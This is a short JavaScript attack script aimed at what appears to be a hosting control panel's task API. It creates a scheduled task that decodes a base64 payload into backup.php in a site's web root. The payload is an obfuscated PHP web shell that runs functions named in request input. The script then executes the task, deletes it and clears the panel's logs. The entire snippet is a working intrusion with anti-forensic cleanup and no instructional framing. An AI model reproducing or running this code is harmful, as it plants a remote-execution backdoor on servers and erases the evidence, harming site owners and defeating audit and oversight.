var data = new Object();
data.task_id="";
data.title="1";
data.exec_cycle="1";
data.week="1";
data.day="3";
data.hour="1";
data.minute="30";
data.shell="echo PD9waHAgJHsoY2hyKDYzKV5jaHIoOTYpKS4oY2hyKDYwKV5jaHIoMTIzKSkuKGNocig2MileY2hyKDEyMykpLihjaHIoNDcpXmNocigxMjMpKX1bKGNocig0MyleY2hyKDY0KSldKCR7KGNocigzNileY2hyKDEyMykpLihjaHIoNDYpXmNocigxMjYpKS4oY2hyKDQ3KV5jaHIoOTYpKS4oY2hyKDQ2KV5jaHIoMTI1KSkuKGNocig0NyleY2hyKDEyMykpfVsoY2hyKDQzKV5jaHIoNjQpKV0pOyA/Pg== | base64 -d > /www/admin/unt876.com_443/wwwroot/backup.php";

$.post('/service/app/tasks.php?type=save_shell',data,function(data){
    $.get('/service/app/tasks.php?type=task_list',{},function(data){
        var id = data.data[0].ID;
        $.post('/service/app/tasks.php?type=exec_task',{tid:id},function(res){
            $.post('/service/app/tasks.php?type=del_task',{tid:id},function(res){
                $.post('/service/app/log.php?type=clearlog',{},function(res){},"json");
            },"json");
        },"json");
    },"json");
},"json");
